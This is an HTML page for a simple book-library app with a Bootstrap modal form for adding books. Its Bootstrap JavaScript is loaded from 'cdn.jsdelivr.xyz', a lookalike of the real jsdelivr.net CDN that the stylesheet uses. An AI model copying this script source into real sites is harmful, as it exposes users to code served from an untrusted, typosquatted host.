<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="UTF-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
		<link
			href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
			rel="stylesheet"
			integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN"
			crossorigin="anonymous"
		/>
		<script
			src="https://cdn.jsdelivr.xyz/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
			integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
			crossorigin="anonymous"
		></script>
		<script src="script.js" defer></script>
		<title>OakDoo</title>
	</head>
	<body>
		<div class="container my-5">
			<div class="row"></div>
			<!-- Button trigger modal -->
			<button
				type="button"
				class="btn btn-primary"
				data-bs-toggle="modal"
				data-bs-target="#bookModal"
			>
				Add book
			</button>
			<!-- Modal -->
			<div
				class="modal fade"
				id="bookModal"
				tabindex="-1"
				role="dialog"
				aria-labelledby="bookModalLabel"
				aria-hidden="true"
				data-bs-backdrop="static"
				data-bs-keyboard="false"
			>
				<div class="modal-dialog modal-dialog-centered" role="document">
					<div class="modal-content">
						<div class="modal-header">
							<h3 class="modal-title" id="bookModalLabel">
								New Book
							</h3>
							<button
								type="button"
								class="btn-close"
								data-bs-dismiss="modal"
								aria-label="Close"
							></button>
						</div>
						<div class="modal-body">
							<form
								id="book-form"
								class="needs-validation"
								novalidate
							>
								<div class="form-floating mb-3">
									<input
										type="text"
										name="book-name"
										id="book-input"
										class="form-control"
										placeholder=""
										required
									/>
									<label for="book-input">Book title*</label>
									<div class="invalid-feedback">
										Please provide a book title
									</div>
								</div>
								<div class="form-floating mb-3">
									<input
										type="text"
										name="author-name"
										id="author-input"
										class="form-control"
										placeholder=""
										required
									/>
									<label for="author-input"
										>Book author*</label
									>
									<div class="invalid-feedback">
										Please provide a book author
									</div>
								</div>
								<div class="form-floating mb-3">
									<input
										type="number"
										name="pages"
										id="pages-input"
										class="form-control"
										placeholder=""
										required
									/>

									<label for="pages-input"
										>Number of pages*</label
									>
									<div class="invalid-feedback">
										Please provide number of pages
									</div>
								</div>
								<div class="form-floating mb-3">
									<input
										type="date"
										name="published-date"
										id="published-input"
										class="form-control"
										placeholder=""
										required
									/>

									<label for="published-input"
										>Publishing date*</label
									>
									<div class="invalid-feedback">
										Please select the publishing date
									</div>
								</div>
								<div class="form-check mt-3">
									<input
										type="checkbox"
										name="read"
										id="read-check"
										class="form-check-input"
										value=""
									/>
									<label
										class="form-check-label"
										for="read-check"
									>
										Have you read it?
									</label>
								</div>
								<div class="d-flex">
									<button
										class="btn btn-primary mt-4 flex-fill"
										type="submit"
										data-bs-dismiss="modal"
									>
										Add book to library
									</button>
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
